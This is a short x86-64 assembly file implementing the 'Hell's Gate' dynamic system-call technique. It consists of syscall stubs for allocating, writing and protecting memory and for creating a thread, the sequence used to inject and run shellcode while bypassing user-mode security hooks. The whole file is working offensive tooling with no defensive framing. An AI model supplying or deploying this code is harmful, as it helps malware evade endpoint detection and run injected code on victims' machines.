; Hell's Gate
; Dynamic system call invocation 
; 
; by smelly__vx (@RtlMateusz) and am0nsec (@am0nsec)

.data
	wSystemCall DWORD 000h

.code 
	HellsGate PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	HellsGate ENDP

	SysNtAllocateVirtualMemory PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtAllocateVirtualMemory ENDP

	SysNtWriteVirtualMemory PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtWriteVirtualMemory ENDP

	SysNtProtectVirtualMemory PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtProtectVirtualMemory ENDP

	SysNtCreateThreadEx PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtCreateThreadEx ENDP

	SysNtWaitForSingleObject PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtWaitForSingleObject ENDP

end
